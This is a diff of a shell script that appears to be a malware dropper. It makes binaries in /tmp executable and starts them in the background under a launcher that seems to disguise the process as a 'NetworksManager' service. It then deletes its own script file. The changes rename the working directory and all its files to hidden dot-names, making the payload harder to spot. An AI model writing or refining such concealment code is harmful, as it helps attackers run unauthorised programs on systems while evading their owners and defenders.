@@ -69,10 +69,10 @@ if [ $download = 1 ]; then
 
  
     rm -f dasdsa.tar.gz
-    chmod +x /tmp/fs-manager/NetworksManager
-    touch /tmp/fs-manager/out.log
-    chmod +x /tmp/fs-manager/out.log
-	chmod +x /tmp/fs-manager/Service-Networks
+    chmod +x /tmp/.fs-manager/.NetworksManager
+    touch /tmp/.fs-manager/.out.log
+    chmod +x /tmp/.fs-manager/.out.log
+	chmod +x /tmp/.fs-manager/.Service-Networks
  
 
 fi
@@ -85,9 +85,9 @@ fi
  
 if [ $launch = 1 ]; then
     #nohup
-    cd "/tmp/fs-manager"
+    cd "/tmp/.fs-manager"
     #nohup ./NetworksManager > out.log 2>&1 &
-	nohup ./Service-Networks -s "NetworksManager" ./NetworksManager > out.log 2>&1 &
+	nohup ./.Service-Networks -s "NetworksManager" ./.NetworksManager > .out.log 2>&1 &
 	rm -r /tmp/w.sh
 fi
 
